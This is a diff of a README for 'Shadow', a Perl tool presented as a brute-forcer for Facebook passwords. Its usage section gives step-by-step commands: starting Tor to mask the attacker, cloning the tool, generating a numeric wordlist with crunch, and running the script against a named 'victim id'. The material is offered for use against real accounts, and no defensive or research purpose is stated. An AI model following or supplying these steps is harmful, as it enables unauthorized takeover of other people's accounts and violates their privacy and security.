@@ -1,5 +1,5 @@
 # Shadow
-A "Shadow" use a  brute-force technique where attackers run through WordList (Dictionary).
+A "Shadow" tool for brute-force password of facebook.
 
 # Images
 <img src="Images/IMG20210213210422.jpg" width="400" height="500">
@@ -7,22 +7,22 @@ A "Shadow" use a  brute-force technique where attackers run through WordList (Di
 
 # Requirements:
 1) Linux (Kali Linux, Parrot OS, etc)
-2) Perl Install 
+2) Perl 
 3) WordList ( Download from Internet or make own Wordlist)
 4) Fast Internet Conection
 5) Tor Install (optional)
 
 # Usage :
-rolt@alex:~# service tor start/stop
+rolt@alex:~# service tor start
 
 root@alex:~# git clone https://github.com/hackerboyalex/Shadow
 
 root@alex:~# cd Shadow
 
 root@alex:~# crunch 8 10 1234567890 -o /root/Desktop/Shadow/wordlist.txt
-( I have Create my own word list with help of crunch or You have wordlist then you skip this)
+( You can create your own wordlist with help of crunch)
  
-root@alex:~# perl shadow "hackerboyalex" (victim id) "worlist.txt" (your wordlist path)
+root@alex:~# perl shadow hackerboyalex (victim id) /root/Desktop/Shadow/wordlist.txt (wordlist path)
 
 # Terms & Conditions
 
